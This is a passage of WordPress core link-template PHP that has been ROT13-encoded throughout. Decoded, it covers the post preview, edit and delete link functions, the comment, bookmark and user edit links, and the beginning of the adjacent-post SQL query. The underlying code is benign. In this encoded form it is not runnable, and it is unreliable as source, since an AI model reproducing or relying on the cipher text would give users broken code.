 * @cnenz vag|JC_Cbfg $cbfg         Bcgvbany. Cbfg VQ be `JC_Cbfg` bowrpg. Qrsnhygf gb tybony `$cbfg`.
 * @cnenz neenl       $dhrel_netf   Bcgvbany. Neenl bs nqqvgvbany dhrel netf gb or nccraqrq gb gur yvax.
 *                                  Qrsnhyg rzcgl neenl.
 * @cnenz fgevat      $cerivrj_yvax Bcgvbany. Onfr cerivrj yvax gb or hfrq vs vg fubhyq qvssre sebz gur
 *                                  cbfg creznyvax. Qrsnhyg rzcgl.
 * @erghea fgevat|ahyy HEY hfrq sbe gur cbfg cerivrj, be ahyy vs gur cbfg qbrf abg rkvfg.
 */
shapgvba trg_cerivrj_cbfg_yvax( $cbfg = ahyy, $dhrel_netf = neenl(), $cerivrj_yvax = '' ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea;
	}

	$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
	vs ( vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr_bowrpg ) ) {
		vs ( ! $cerivrj_yvax ) {
			$cerivrj_yvax = frg_hey_fpurzr( trg_creznyvax( $cbfg ) );
		}

		$dhrel_netf['cerivrj'] = 'gehr';
		$cerivrj_yvax          = nqq_dhrel_net( $dhrel_netf, $cerivrj_yvax );
	}

	/**
	 * Svygref gur HEY hfrq sbe n cbfg cerivrj.
	 *
	 * @fvapr 2.0.5
	 * @fvapr 4.0.0 Nqqrq gur `$cbfg` cnenzrgre.
	 *
	 * @cnenz fgevat  $cerivrj_yvax HEY hfrq sbe gur cbfg cerivrj.
	 * @cnenz JC_Cbfg $cbfg         Cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'cerivrj_cbfg_yvax', $cerivrj_yvax, $cbfg );
}

/**
 * Ergevrirf gur rqvg cbfg yvax sbe cbfg.
 *
 * Pna or hfrq jvguva gur JbeqCerff ybbc be bhgfvqr bs vg. Pna or hfrq jvgu
 * cntrf, cbfgf, nggnpuzragf, erivfvbaf, tybony fglyrf, grzcyngrf, naq grzcyngr cnegf.
 *
 * @fvapr 2.3.0
 * @fvapr 6.3.0 Nqqf phfgbz yvax sbe jc_anivtngvba cbfg glcrf.
 *              Nqqf phfgbz yvaxf sbe jc_grzcyngr_cneg naq jc_grzcyngr cbfg glcrf.
 *
 * @cnenz vag|JC_Cbfg $cbfg    Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 * @cnenz fgevat      $pbagrkg Bcgvbany. Ubj gb bhgchg gur '&' punenpgre. Qrsnhyg '&nzc;'.
 * @erghea fgevat|ahyy Gur rqvg cbfg yvax sbe gur tvira cbfg. Ahyy vs gur cbfg glcr qbrf abg rkvfg
 *                     be qbrf abg nyybj na rqvgvat HV.
 */
shapgvba trg_rqvg_cbfg_yvax( $cbfg = 0, $pbagrkg = 'qvfcynl' ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea;
	}

	vs ( 'erivfvba' === $cbfg->cbfg_glcr ) {
		$npgvba = '';
	} ryfrvs ( 'qvfcynl' === $pbagrkg ) {
		$npgvba = '&nzc;npgvba=rqvg';
	} ryfr {
		$npgvba = '&npgvba=rqvg';
	}

	$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

	vs ( ! $cbfg_glcr_bowrpg ) {
		erghea;
	}

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) ) {
		erghea;
	}

	$yvax = '';

	vs ( 'jc_grzcyngr' === $cbfg->cbfg_glcr || 'jc_grzcyngr_cneg' === $cbfg->cbfg_glcr ) {
		$fyht = heyrapbqr( trg_fglyrfurrg() . '//' . $cbfg->cbfg_anzr );
		$yvax = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax, $cbfg->cbfg_glcr, $fyht ) );
	} ryfrvs ( 'jc_anivtngvba' === $cbfg->cbfg_glcr ) {
		$yvax = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax, (fgevat) $cbfg->VQ ) );
	} ryfrvs ( $cbfg_glcr_bowrpg->_rqvg_yvax ) {
		$yvax = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax . $npgvba, $cbfg->VQ ) );
	}

	/**
	 * Svygref gur cbfg rqvg yvax.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat $yvax    Gur rqvg yvax.
	 * @cnenz vag    $cbfg_vq Cbfg VQ.
	 * @cnenz fgevat $pbagrkg Gur yvax pbagrkg. Vs frg gb 'qvfcynl' gura nzcrefnaqf
	 *                        ner rapbqrq.
	 */
	erghea nccyl_svygref( 'trg_rqvg_cbfg_yvax', $yvax, $cbfg->VQ, $pbagrkg );
}

/**
 * Qvfcynlf gur rqvg cbfg yvax sbe cbfg.
 *
 * @fvapr 1.0.0
 * @fvapr 4.4.0 Gur `$pff_pynff` nethzrag jnf nqqrq.
 *
 * @cnenz fgevat      $grkg      Bcgvbany. Napube grkg. Vs ahyy, qrsnhyg vf 'Rqvg Guvf'. Qrsnhyg ahyy.
 * @cnenz fgevat      $orsber    Bcgvbany. Qvfcynl orsber rqvg yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat      $nsgre     Bcgvbany. Qvfcynl nsgre rqvg yvax. Qrsnhyg rzcgl.
 * @cnenz vag|JC_Cbfg $cbfg      Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 * @cnenz fgevat      $pff_pynff Bcgvbany. Nqq phfgbz pynff gb yvax. Qrsnhyg 'cbfg-rqvg-yvax'.
 */
shapgvba rqvg_cbfg_yvax( $grkg = ahyy, $orsber = '', $nsgre = '', $cbfg = 0, $pff_pynff = 'cbfg-rqvg-yvax' ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea;
	}

	$hey = trg_rqvg_cbfg_yvax( $cbfg->VQ );

	vs ( ! $hey ) {
		erghea;
	}

	vs ( ahyy === $grkg ) {
		$grkg = __( 'Rqvg Guvf' );
	}

	$yvax = '<n pynff=\"' . rfp_ngge( $pff_pynff ) . '\" uers=\"' . rfp_hey( $hey ) . '\">' . $grkg . '</n>';

	/**
	 * Svygref gur cbfg rqvg yvax napube gnt.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat $yvax    Napube gnt sbe gur rqvg yvax.
	 * @cnenz vag    $cbfg_vq Cbfg VQ.
	 * @cnenz fgevat $grkg    Napube grkg.
	 */
	rpub $orsber . nccyl_svygref( 'rqvg_cbfg_yvax', $yvax, $cbfg->VQ, $grkg ) . $nsgre;
}

/**
 * Ergevrirf gur qryrgr cbfgf yvax sbe cbfg.
 *
 * Pna or hfrq jvguva gur JbeqCerff ybbc be bhgfvqr bs vg, jvgu nal cbfg glcr.
 *
 * @fvapr 2.9.0
 *
 * @cnenz vag|JC_Cbfg $cbfg         Bcgvbany. Cbfg VQ be cbfg bowrpg. Qrsnhyg vf gur tybony `$cbfg`.
 * @cnenz fgevat      $qrcerpngrq   Abg hfrq.
 * @cnenz obby        $sbepr_qryrgr Bcgvbany. Jurgure gb olcnff Genfu naq sbepr qryrgvba. Qrsnhyg snyfr.
 * @erghea fgevat|ibvq Gur qryrgr cbfg yvax HEY sbe gur tvira cbfg.
 */
shapgvba trg_qryrgr_cbfg_yvax( $cbfg = 0, $qrcerpngrq = '', $sbepr_qryrgr = snyfr ) {
	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.0.0' );
	}

	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea;
	}

	$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

	vs ( ! $cbfg_glcr_bowrpg ) {
		erghea;
	}

	vs ( ! pheerag_hfre_pna( 'qryrgr_cbfg', $cbfg->VQ ) ) {
		erghea;
	}

	$npgvba = ( $sbepr_qryrgr || ! RZCGL_GENFU_QNLF ) ? 'qryrgr' : 'genfu';

	$qryrgr_yvax = nqq_dhrel_net( 'npgvba', $npgvba, nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax, $cbfg->VQ ) ) );

	/**
	 * Svygref gur cbfg qryrgr yvax.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat $yvax         Gur qryrgr yvax.
	 * @cnenz vag    $cbfg_vq      Cbfg VQ.
	 * @cnenz obby   $sbepr_qryrgr Jurgure gb olcnff gur Genfu naq sbepr qryrgvba. Qrsnhyg snyfr.
	 */
	erghea nccyl_svygref( 'trg_qryrgr_cbfg_yvax', jc_abapr_hey( $qryrgr_yvax, \"$npgvba-cbfg_{$cbfg->VQ}\" ), $cbfg->VQ, $sbepr_qryrgr );
}

/**
 * Ergevrirf gur rqvg pbzzrag yvax.
 *
 * @fvapr 2.3.0
 * @fvapr 6.7.0 Gur $pbagrkg cnenzrgre jnf nqqrq.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany. Pbzzrag VQ be JC_Pbzzrag bowrpg.
 * @cnenz fgevat         $pbagrkg    Bcgvbany. Pbagrkg va juvpu gur HEY fubhyq or hfrq. Rvgure 'qvfcynl',
 *                                   gb vapyhqr UGZY ragvgvrf, be 'hey'. Qrsnhyg 'qvfcynl'.
 * @erghea fgevat|ibvq Gur rqvg pbzzrag yvax HEY sbe gur tvira pbzzrag, be ibvq vs gur pbzzrag vq qbrf abg rkvfg be
 *                     gur pheerag hfre vf abg nyybjrq gb rqvg vg.
 */
shapgvba trg_rqvg_pbzzrag_yvax( $pbzzrag_vq = 0, $pbagrkg = 'qvfcynl' ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	vs ( ! vf_bowrpg( $pbzzrag ) || ! pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ ) ) {
		erghea;
	}

	vs ( 'qvfcynl' === $pbagrkg ) {
		$npgvba = 'pbzzrag.cuc?npgvba=rqvgpbzzrag&nzc;p=';
	} ryfr {
		$npgvba = 'pbzzrag.cuc?npgvba=rqvgpbzzrag&p=';
	}

	$ybpngvba = nqzva_hey( $npgvba ) . $pbzzrag->pbzzrag_VQ;

	// Rafher gur $pbzzrag_vq inevnoyr cnffrq gb gur svygre vf nyjnlf na VQ.
	$pbzzrag_vq = (vag) $pbzzrag->pbzzrag_VQ;

	/**
	 * Svygref gur pbzzrag rqvg yvax.
	 *
	 * @fvapr 2.3.0
	 * @fvapr 6.7.0 Gur $pbzzrag_vq naq $pbagrkg cnenzrgref ner abj orvat cnffrq gb gur svygre.
	 *
	 * @cnenz fgevat $ybpngvba   Gur rqvg yvax.
	 * @cnenz vag    $pbzzrag_vq Havdhr VQ bs gur pbzzrag gb trarengr na rqvg yvax.
	 * @cnenz fgevat $pbagrkg    Pbagrkg gb vapyhqr UGZY ragvgvrf va yvax. Qrsnhyg 'qvfcynl'.
	 */
	erghea nccyl_svygref( 'trg_rqvg_pbzzrag_yvax', $ybpngvba, $pbzzrag_vq, $pbagrkg );
}

/**
 * Qvfcynlf gur rqvg pbzzrag yvax jvgu sbeznggvat.
 *
 * @fvapr 1.0.0
 *
 * @cnenz fgevat $grkg   Bcgvbany. Napube grkg. Vs ahyy, qrsnhyg vf 'Rqvg Guvf'. Qrsnhyg ahyy.
 * @cnenz fgevat $orsber Bcgvbany. Qvfcynl orsber rqvg yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre  Bcgvbany. Qvfcynl nsgre rqvg yvax. Qrsnhyg rzcgl.
 */
shapgvba rqvg_pbzzrag_yvax( $grkg = ahyy, $orsber = '', $nsgre = '' ) {
	$pbzzrag = trg_pbzzrag();

	vs ( ! pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ ) ) {
		erghea;
	}

	vs ( ahyy === $grkg ) {
		$grkg = __( 'Rqvg Guvf' );
	}

	$yvax = '<n pynff=\"pbzzrag-rqvg-yvax\" uers=\"' . rfp_hey( trg_rqvg_pbzzrag_yvax( $pbzzrag ) ) . '\">' . $grkg . '</n>';

	/**
	 * Svygref gur pbzzrag rqvg yvax napube gnt.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat $yvax       Napube gnt sbe gur rqvg yvax.
	 * @cnenz fgevat $pbzzrag_vq Pbzzrag VQ nf n ahzrevp fgevat.
	 * @cnenz fgevat $grkg       Napube grkg.
	 */
	rpub $orsber . nccyl_svygref( 'rqvg_pbzzrag_yvax', $yvax, $pbzzrag->pbzzrag_VQ, $grkg ) . $nsgre;
}

/**
 * Qvfcynlf gur rqvg obbxznex yvax.
 *
 * @fvapr 2.7.0
 *
 * @cnenz vag|fgqPynff $yvax Bcgvbany. Obbxznex VQ. Qrsnhyg vf gur VQ bs gur pheerag obbxznex.
 * @erghea fgevat|ibvq Gur rqvg obbxznex yvax HEY.
 */
shapgvba trg_rqvg_obbxznex_yvax( $yvax = 0 ) {
	$yvax = trg_obbxznex( $yvax );

	vs ( ! pheerag_hfre_pna( 'znantr_yvaxf' ) ) {
		erghea;
	}

	$ybpngvba = nqzva_hey( 'yvax.cuc?npgvba=rqvg&nzc;yvax_vq=' ) . $yvax->yvax_vq;

	/**
	 * Svygref gur obbxznex rqvg yvax.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $ybpngvba Gur rqvg yvax.
	 * @cnenz vag    $yvax_vq  Obbxznex VQ.
	 */
	erghea nccyl_svygref( 'trg_rqvg_obbxznex_yvax', $ybpngvba, $yvax->yvax_vq );
}

/**
 * Qvfcynlf gur rqvg obbxznex yvax napube pbagrag.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $yvax     Bcgvbany. Napube grkg. Vs rzcgl, qrsnhyg vf 'Rqvg Guvf'. Qrsnhyg rzcgl.
 * @cnenz fgevat $orsber   Bcgvbany. Qvfcynl orsber rqvg yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre    Bcgvbany. Qvfcynl nsgre rqvg yvax. Qrsnhyg rzcgl.
 * @cnenz vag    $obbxznex Bcgvbany. Obbxznex VQ. Qrsnhyg vf gur pheerag obbxznex.
 */
shapgvba rqvg_obbxznex_yvax( $yvax = '', $orsber = '', $nsgre = '', $obbxznex = ahyy ) {
	$obbxznex = trg_obbxznex( $obbxznex );

	vs ( ! pheerag_hfre_pna( 'znantr_yvaxf' ) ) {
		erghea;
	}

	vs ( rzcgl( $yvax ) ) {
		$yvax = __( 'Rqvg Guvf' );
	}

	$yvax = '<n uers=\"' . rfp_hey( trg_rqvg_obbxznex_yvax( $obbxznex ) ) . '\">' . $yvax . '</n>';

	/**
	 * Svygref gur obbxznex rqvg yvax napube gnt.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $yvax    Napube gnt sbe gur rqvg yvax.
	 * @cnenz vag    $yvax_vq Obbxznex VQ.
	 */
	rpub $orsber . nccyl_svygref( 'rqvg_obbxznex_yvax', $yvax, $obbxznex->yvax_vq ) . $nsgre;
}

/**
 * Ergevrirf gur rqvg hfre yvax.
 *
 * @fvapr 3.5.0
 *
 * @cnenz vag $hfre_vq Bcgvbany. Hfre VQ. Qrsnhygf gb gur pheerag hfre.
 * @erghea fgevat HEY gb rqvg hfre cntr be rzcgl fgevat.
 */
shapgvba trg_rqvg_hfre_yvax( $hfre_vq = ahyy ) {
	vs ( ! $hfre_vq ) {
		$hfre_vq = trg_pheerag_hfre_vq();
	}

	vs ( rzcgl( $hfre_vq ) || ! pheerag_hfre_pna( 'rqvg_hfre', $hfre_vq ) ) {
		erghea '';
	}

	$hfre = trg_hfreqngn( $hfre_vq );

	vs ( ! $hfre ) {
		erghea '';
	}

	vs ( trg_pheerag_hfre_vq() === $hfre->VQ ) {
		$yvax = trg_rqvg_cebsvyr_hey( $hfre->VQ );
	} ryfr {
		$yvax = nqq_dhrel_net( 'hfre_vq', $hfre->VQ, frys_nqzva_hey( 'hfre-rqvg.cuc' ) );
	}

	/**
	 * Svygref gur hfre rqvg yvax.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $yvax    Gur rqvg yvax.
	 * @cnenz vag    $hfre_vq Hfre VQ.
	 */
	erghea nccyl_svygref( 'trg_rqvg_hfre_yvax', $yvax, $hfre->VQ );
}

//
// Anivtngvba yvaxf.
//

/**
 * Ergevrirf gur cerivbhf cbfg gung vf nqwnprag gb gur pheerag cbfg.
 *
 * @fvapr 1.5.0
 *
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure cbfg fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 * @erghea JC_Cbfg|ahyy|fgevat Cbfg bowrpg vs fhpprffshy. Ahyy vs tybony `$cbfg` vf abg frg.
 *                             Rzcgl fgevat vs ab pbeerfcbaqvat cbfg rkvfgf.
 */
shapgvba trg_cerivbhf_cbfg( $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $gnkbabzl = 'pngrtbel' ) {
	erghea trg_nqwnprag_cbfg( $va_fnzr_grez, $rkpyhqrq_grezf, gehr, $gnkbabzl );
}

/**
 * Ergevrirf gur arkg cbfg gung vf nqwnprag gb gur pheerag cbfg.
 *
 * @fvapr 1.5.0
 *
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure cbfg fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 * @erghea JC_Cbfg|ahyy|fgevat Cbfg bowrpg vs fhpprffshy. Ahyy vs tybony `$cbfg` vf abg frg.
 *                             Rzcgl fgevat vs ab pbeerfcbaqvat cbfg rkvfgf.
 */
shapgvba trg_arkg_cbfg( $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $gnkbabzl = 'pngrtbel' ) {
	erghea trg_nqwnprag_cbfg( $va_fnzr_grez, $rkpyhqrq_grezf, snyfr, $gnkbabzl );
}

/**
 * Ergevrirf gur nqwnprag cbfg.
 *
 * Pna rvgure or arkg be cerivbhf cbfg.
 *
 * @fvapr 2.5.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure cbfg fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl fgevat.
 * @cnenz obby         $cerivbhf       Bcgvbany. Jurgure gb ergevrir cerivbhf cbfg.
 *                                     Qrsnhyg gehr.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 * @erghea JC_Cbfg|ahyy|fgevat Cbfg bowrpg vs fhpprffshy. Ahyy vs tybony `$cbfg` vf abg frg.
 *                             Rzcgl fgevat vs ab pbeerfcbaqvat cbfg rkvfgf.
 */
shapgvba trg_nqwnprag_cbfg( $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $cerivbhf = gehr, $gnkbabzl = 'pngrtbel' ) {
	tybony $jcqo;

	$cbfg = trg_cbfg();

	vs ( ! $cbfg || ! gnkbabzl_rkvfgf( $gnkbabzl ) ) {
		erghea ahyy;
	}

	$pheerag_cbfg_qngr = $cbfg->cbfg_qngr;

	$wbva     = '';
	$jurer    = '';
	$nqwnprag = $cerivbhf ? 'cerivbhf' : 'arkg';

	vs ( ! rzcgl( $rkpyhqrq_grezf ) && ! vf_neenl( $rkpyhqrq_grezf ) ) {
		// Onpx-pbzcng, $rkpyhqrq_grezf hfrq gb or $rkpyhqrq_pngrtbevrf jvgu VQf frcnengrq ol \" naq \".
		vs ( fge_pbagnvaf( $rkpyhqrq_grezf, ' naq ' ) ) {
			_qrcerpngrq_nethzrag(
				__SHAPGVBA__,
				'3.3.0',
				fcevags(
					/* genafyngbef: %f: Gur jbeq 'naq'. */
					__( 'Hfr pbzznf vafgrnq bs %f gb frcnengr rkpyhqrq grezf.' ),
					\"'naq'\"
				)
			);
			$rkpyhqrq_grezf = rkcybqr( ' naq ', $rkpyhqrq_grezf );
		} ryfr {
			$rkpyhqrq_grezf = rkcybqr( ',', $rkpyhqrq_grezf );
		}

		$rkpyhqrq_grezf = neenl_znc( 'vaginy', $rkpyhqrq_grezf );
	}

	/**
	 * Svygref gur VQf bs grezf rkpyhqrq sebz nqwnprag cbfg dhrevrf.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$nqwnprag`, ersref gb gur glcr
	 * bs nqwnprapl, 'arkg' be 'cerivbhf'.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `trg_arkg_cbfg_rkpyhqrq_grezf`
	 *  - `trg_cerivbhf_cbfg_rkpyhqrq_grezf`
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Neenl bs rkpyhqrq grez VQf. Rzcgl fgevat vs abar jrer cebivqrq.
	 */
	$rkpyhqrq_grezf = nccyl_svygref( \"trg_{$nqwnprag}_cbfg_rkpyhqrq_grezf\", $rkpyhqrq_grezf );

	vs ( $va_fnzr_grez || ! rzcgl( $rkpyhqrq_grezf ) ) {
		vs ( $va_fnzr_grez ) {
			$wbva  .= \" VAARE WBVA $jcqo->grez_eryngvbafuvcf NF ge BA c.VQ = ge.bowrpg_vq VAARE WBVA $jcqo->grez_gnkbabzl NF gg BA ge.grez_gnkbabzl_vq = gg.grez_gnkbabzl_vq\";
			$jurer .= $jcqo->cercner( 'NAQ gg.gnkbabzl = %f', $gnkbabzl );

			vs ( ! vf_bowrpg_va_gnkbabzl( $cbfg->cbfg_glcr, $gnkbabzl ) ) {
				erghea '';
			}
			$grez_neenl = jc_trg_bowrpg_grezf( $cbfg->VQ, $gnkbabzl, neenl( 'svryqf' => 'vqf' ) );

			// Erzbir nal rkpyhfvbaf sebz gur grez neenl gb vapyhqr.
			$grez_neenl = neenl_qvss( $grez_neenl, (neenl) $rkpyhqrq_grezf );
			$grez_neenl = neenl_znc( 'vaginy', $grez_neenl );

			vs ( ! $grez_neenl || vf_jc_reebe( $grez_neenl ) ) {
				erghea '';
			}

			$jurer .= ' NAQ gg.grez_vq VA (' . vzcybqr( ',', $grez_neenl ) . ')';
		}

		vs ( ! rzcgl( $rkpyhqrq_grezf ) ) {
			$jurer .= \" NAQ c.VQ ABG VA ( FRYRPG ge.bowrpg_vq SEBZ $jcqo->grez_eryngvbafuvcf ge YRSG WBVA $jcqo->grez_gnkbabzl gg BA (ge.grez_gnkbabzl_vq = gg.grez_gnkbabzl_vq) JURER gg.grez_vq VA (\" . vzcybqr( ',', neenl_znc( 'vaginy', $rkpyhqrq_grezf ) ) . ') )';
		}
	}

	// 'cbfg_fgnghf' pynhfr qrcraqf ba gur pheerag hfre.
	vs ( vf_hfre_ybttrq_va() ) {
		$hfre_vq = trg_pheerag_hfre_vq();

		$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
		vs ( rzcgl( $cbfg_glcr_bowrpg ) ) {
			$cbfg_glcr_pnc    = $cbfg->cbfg_glcr;
			$ernq_cevingr_pnc = 'ernq_cevingr_' . $cbfg_glcr_pnc . 'f';
		} ryfr {
			$ernq_cevingr_pnc = $cbfg_glcr_bowrpg->pnc->ernq_cevingr_cbfgf;
		}

		/*
		 * Erfhygf fubhyq vapyhqr cevingr cbfgf orybatvat gb gur pheerag hfre, be cevingr cbfgf jurer gur
		 * pheerag hfre unf gur 'ernq_cevingr_cbfgf' pnc.
		 */
		$cevingr_fgngrf = trg_cbfg_fgngv( neenl( 'cevingr' => gehr ) );
		$jurer         .= \" NAQ ( c.cbfg_fgnghf = 'choyvfu'\";
		sbernpu ( $cevingr_fgngrf nf $fgngr ) {
			vs ( pheerag_hfre_pna( $ernq_cevingr_pnc ) ) {
				$jurer .= $jcqo->cercner( ' BE c.cbfg_fgnghf = %f', $fgngr );
			} ryfr {
				$jurer .= $jcqo->cercner( ' BE (c.cbfg_nhgube = %q NAQ c.cbfg_fgnghf = %f)', $hfre_vq, $fgngr );
			}
		}
		$jurer .= ' )';
	} ryfr {
		$jurer .= \" NAQ c.cbfg_fgnghf = 'choyvfu'\";
	}

	$bc    = $cerivbhf ? '<' : '>';
	$beqre = $cerivbhf ? 'QRFP' : 'NFP';

	/**
	 * Svygref gur WBVA pynhfr va gur FDY sbe na nqwnprag cbfg dhrel.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$nqwnprag`, ersref gb gur glcr
	 * bs nqwnprapl, 'arkg' be 'cerivbhf'.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `trg_arkg_cbfg_wbva`
	 *  - `trg_cerivbhf_cbfg_wbva`
	 *
	 * @fvapr 2.5.0
	 * @fvapr 4.4.0 Nqqrq gur `$gnkbabzl` naq `$cbfg` cnenzrgref.
	 *
	 * @cnenz fgevat       $wbva           Gur WBVA pynhfr va gur FDY.
	 * @cnenz obby         $va_fnzr_grez   Jurgure cbfg fubhyq or va gur fnzr gnkbabzl grez.
	 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Neenl bs rkpyhqrq grez VQf. Rzcgl fgevat vs abar jrer cebivqrq.
	 * @cnenz fgevat       $gnkbabzl       Gnkbabzl. Hfrq gb vqragvsl gur grez hfrq jura `$va_fnzr_grez` vf gehr.
	 * @cnenz JC_Cbfg      $cbfg           JC_Cbfg bowrpg.
	 */
	$wbva = nccyl_svygref( \"trg_{$nqwnprag}_cbfg_wbva\", $wbva, $va_fnzr_grez, $rkpyhqrq_grezf, $gnkbabzl, $cbfg );

	/**
	 * Svygref gur JURER pynhfr va gur FDY sbe na nqwnprag cbfg dhrel.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$nqwnprag`, ersref gb gur glcr
	 * bs nqwnprapl, 'arkg' be 'cerivbhf'.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `trg_arkg_cbfg_jurer`
	 *  - `trg_cerivbhf_cbfg_jurer`
	 *
	 * @fvapr 2.5.0
	 * @fvapr 4.4.0 Nqqrq gur `$gnkbabzl` naq `$cbfg` cnenzrgref.
	 *
	 * @cnenz fgevat       $jurer          Gur `JURER` pynhfr va gur FDY.
	 * @cnenz obby         $va_fnzr_grez   Jurgure cbfg fubhyq or va gur fnzr gnkbabzl grez.
	 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Neenl bs rkpyhqrq grez VQf. Rzcgl fgevat vs abar jrer cebivqrq.
	 * @cnenz fgevat       $gnkbabzl       Gnkbabzl. Hfrq gb vqragvsl gur grez hfrq jura `$va_fnzr_grez` vf gehr.
	 * @cnenz JC_Cbfg      $cbfg           JC_Cbfg bowrpg.
	 */
	$jurer = nccyl_svygref( \"trg_{$nqwnprag}_cbfg_jurer\", $jcqo->cercner( \"JURER c.cbfg_qngr $bc %f NAQ c.cbfg_glcr = %f $jurer\", $pheerag_cbfg_qngr, $cbfg->cbfg_glcr ), $va_fnzr_grez, $rkpyhqrq_grezf, $gnkbabzl, $cbfg );

	/**
	 * Svygref gur BEQRE OL pynhfr va gur FDY sbe na nqwnprag cbfg dhrel.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$nqwnprag`, ersref gb gur glcr
	 * bs nqwnprapl, 'arkg' be 'cerivbhf'.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `trg_arkg_cbfg_fbeg`
	 *  - `trg_cerivbhf_cbfg_fbeg`
	 *
	 * @fvapr 2.5.0
	 * @fvapr 4.4.0 Nqqrq gur `$cbfg` cnenzrgre.
	 * @fvapr 4.9.0 Nqqrq gur `$beqre` cnenzrgre.
	 *
	 * @cnenz fgevat $beqre_ol Gur `BEQRE OL` pynhfr va gur FDY.
	 * @cnenz JC_Cbfg $cbfg    JC_Cbfg bowrpg.
	 * @cnenz fgevat  $beqre   Fbeg beqre. 'QRFP' sbe cerivbhf cbfg, 'NFP' sbe arkg.
	 */
	$fbeg = nccyl_svygref( \"trg_{$nqwnprag}_cbfg_fbeg\", \"BEQRE OL c.cbfg_qngr $beqre YVZVG 1\", $cbfg, $beqre );

	$dhrel        = \"FRYRPG c.VQ SEBZ $jcqo->cbfgf NF c $wbva $jurer $fbeg\";
	$xrl          = zq5( $dhrel );
	$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'cbfgf' );
	vs ( $va_fnzr_grez || ! rzcgl( $rkpyhqrq_grezf ) ) {
		$ynfg_punatrq .= jc_pnpur_trg_ynfg_punatrq( 'grezf' );
	}
	$pnpur_xrl = \"nqwnprag_cbfg:$xrl:$ynfg_punatrq\";

